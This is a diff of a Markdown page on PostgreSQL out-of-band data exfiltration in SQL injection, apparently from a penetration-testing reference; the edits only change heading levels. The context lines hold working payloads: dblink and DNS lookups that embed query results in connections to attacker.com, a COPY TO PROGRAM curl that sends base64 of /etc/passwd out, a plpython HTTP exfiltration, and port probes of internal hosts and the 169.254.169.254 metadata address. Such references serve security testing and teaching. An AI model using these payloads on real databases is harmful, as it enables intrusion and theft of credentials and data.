@@ -7,22 +7,20 @@ tags: ["OOB", "exfiltration", "DNS", "dblink"]
 lastUpdated: 2025-12-14
 ---
 
-## Out of Band Channeling
-
 Out-of-band (OOB) channeling refers to techniques that exfiltrate data through channels other than the application's normal response. This approach is valuable in blind SQL injection scenarios where no data is returned in the application's response.
 
-### When to Use OOB Techniques
+## When to Use OOB Techniques
 
 - Blind SQL injection scenarios where no output is visible
 - Asynchronous query execution prevents time-based attacks
 - Application responses are filtered or truncated
 - Firewall rules block traditional SQL injection but allow outbound connections
 
-### PostgreSQL OOB Methods
+## PostgreSQL OOB Methods
 
 PostgreSQL offers several mechanisms for out-of-band data exfiltration:
 
-#### 1. dblink Data Exfiltration
+### 1. dblink Data Exfiltration
 
 The `dblink` extension allows PostgreSQL to connect to remote PostgreSQL servers. Data can be exfiltrated by embedding query results in connection parameters:
 
@@ -36,7 +34,7 @@ SELECT dblink_connect('host=attacker.com user=' || (SELECT version()) || ' passw
 
 The attacker monitors network traffic to capture the plaintext PostgreSQL protocol packets containing the exfiltrated data.
 
-#### 2. DNS Exfiltration via dblink
+### 2. DNS Exfiltration via dblink
 
 ```sql
 -- Exfiltrate data via DNS lookup
@@ -45,7 +43,7 @@ SELECT dblink_connect('host=' || (SELECT version()) || '.attacker.com user=x pas
 
 This causes PostgreSQL to perform a DNS lookup for a subdomain containing the extracted data.
 
-#### 3. COPY TO PROGRAM
+### 3. COPY TO PROGRAM
 
 If you have superuser privileges, `COPY TO PROGRAM` executes shell commands:
 
@@ -60,7 +58,7 @@ COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data=$(base64 /etc/passwd
 COPY (SELECT version()) TO PROGRAM 'curl -d @- http://attacker.com/collect';
 ```
 
-#### 4. Large Object Exfiltration
+### 4. Large Object Exfiltration
 
 Large Objects can load files that are then exfiltrated via dblink:
 
@@ -80,9 +78,9 @@ SELECT dblink_connect('host=attacker.com user=' ||
 SELECT lo_unlink(16444);
 ```
 
-### Practical Examples
+## Practical Examples
 
-#### Metadata Extraction via dblink
+### Metadata Extraction via dblink
 
 ```sql
 -- Extract database list
@@ -101,7 +99,7 @@ SELECT dblink_connect('host=attacker.com user=' ||
     ' password=x dbname=x');
 ```
 
-#### Data Extraction via dblink
+### Data Extraction via dblink
 
 ```sql
 -- Extract usernames
@@ -115,7 +113,7 @@ SELECT dblink_connect('host=attacker.com user=' ||
     ' password=x dbname=x');
 ```
 
-#### UNION-Based dblink Injection
+### UNION-Based dblink Injection
 
 ```sql
 -- In a UNION injection context
@@ -124,9 +122,9 @@ SELECT dblink_connect('host=attacker.com user=' ||
     ' password=x dbname=x')) --
 ```
 
-### Encoding for Transport
+## Encoding for Transport
 
-#### Handling Whitespace and Special Characters
+### Handling Whitespace and Special Characters
 
 PostgreSQL connection strings cannot contain whitespace. Encode or replace special characters:
 
@@ -147,7 +145,7 @@ SELECT dblink_connect('host=attacker.com user=' ||
     ' password=x dbname=x');
 ```
 
-#### Chunking Large Data
+### Chunking Large Data
 
 DNS labels have a maximum length of 63 characters, domains 253 total:
 
@@ -162,7 +160,7 @@ SELECT dblink_connect('host=' ||
     '.chunk2.attacker.com user=x password=x dbname=x');
 ```
 
-### Port Scanning via dblink
+## Port Scanning via dblink
 
 The `dblink_connect` function can be used to perform port scanning by analyzing error messages or connection behavior.
 
@@ -261,7 +259,7 @@ SELECT dblink_connect('host=internal-service.local port=6379 user=x password=x d
 SELECT dblink_connect('host=169.254.169.254 port=80 user=x password=x dbname=x');
 ```
 
-### Using pg_notify for Exfiltration
+## Using pg_notify for Exfiltration
 
 The `NOTIFY` command can be captured if you have a listening connection:
 
@@ -273,7 +271,7 @@ SELECT pg_notify('channel', (SELECT version()));
 LISTEN channel;
 ```
 
-### HTTP Extensions
+## HTTP Extensions
 
 Some PostgreSQL installations have HTTP extensions for outbound requests.
 
@@ -290,7 +288,7 @@ urllib.request.urlopen('http://attacker.com/?d=' + data)
 $$ LANGUAGE plpython3u;
 ```
 
-### Required Setup
+## Required Setup
 
 To capture exfiltrated data, you need:
 
@@ -298,7 +296,7 @@ To capture exfiltrated data, you need:
 2. **For DNS**: A domain you control with DNS logging (or Burp Collaborator)
 3. **For HTTP**: A web server to receive requests
 
-### Checking for dblink Availability
+## Checking for dblink Availability
 
 ```sql
 -- Check if dblink extension exists
@@ -311,7 +309,7 @@ SELECT proname FROM pg_proc WHERE proname LIKE 'dblink%';
 CREATE EXTENSION IF NOT EXISTS dblink;
 ```
 
-### Limitations
+## Limitations
 
 1. `dblink` extension must be installed and accessible
 2. Outbound network connections must be allowed
@@ -320,7 +318,7 @@ CREATE EXTENSION IF NOT EXISTS dblink;
 5. PostgreSQL protocol packets are plaintext by default
 6. Some cloud PostgreSQL instances restrict outbound connections
 
-### Privilege Requirements
+## Privilege Requirements
 
 | Method          | Minimum Privilege Required             |
 | --------------- | -------------------------------------- |
@@ -329,7 +327,7 @@ CREATE EXTENSION IF NOT EXISTS dblink;
 | lo_import       | Create large objects privilege         |
 | pg_notify       | No special privileges                  |
 
-### Detection and Mitigation
+## Detection and Mitigation
 
 To prevent OOB attacks:
 
